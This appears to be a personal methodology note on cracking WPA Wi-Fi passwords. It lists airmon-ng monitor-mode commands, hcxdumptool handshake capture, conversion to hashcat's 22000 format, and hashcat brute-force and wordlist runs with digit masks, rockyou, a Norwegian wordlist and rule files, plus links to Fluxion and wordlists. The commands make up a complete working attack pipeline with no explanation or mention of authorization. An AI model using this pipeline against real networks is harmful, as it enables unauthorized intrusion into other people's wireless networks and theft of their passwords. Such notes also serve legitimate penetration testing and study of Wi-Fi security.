<https://github.com/FluxionNetwork/fluxion>

2, 1, 3, 2, 1

```
editcap -F pcap firstcapture.cap wpa-capture.pcap
```

### sudo airmon-ng check kill 
### sudo airmon-ng start wlan0 

=================
##### Preferred way:
```
apt install hcxtools -y

airmon-ng start wlan0
sudo hcxdumptool -i wlan0 -w hcxdump.pcap
hcxpcapngtool hcxdump.pcap -o hc.hc22000
.\hashcat.exe -m 22000 -a 3 ?d?d?d?d?d?d?d?d -w 3 -O -force
C:\Users\Christopher\Downloads\hashcat-6.2.6>.\hashcat.exe -w3 -O -S -m 22000 hcxdump2.hc22000 ..\mystery-list.txt


.\hashcat.exe -m 22000 .\new_hash.hc22000 -a 3 --increment --increment-min 8 --increment-max 9 ?d?d?d?d?d?d?d?d -O --force -w 3
hashcat.exe -m 22000 hash.hc22000 rockyou.txt -r 2.rule
hashcat.exe -m 22000 hash.hc22000 norwegian.txt -r 2.rule

```
<https://github.com/Ondkloss/norwegian-wordlist/blob/master/wordlist_20220201_norsk_ordbank_nob_2005.txt>
<https://github.com/ignis-sec/Pwdb-Public/blob/master/wordlists/ignis-10M.txt>

[[_Methodology/5. Cracking & Bruteforcing/Hashcat/Hashcat]]

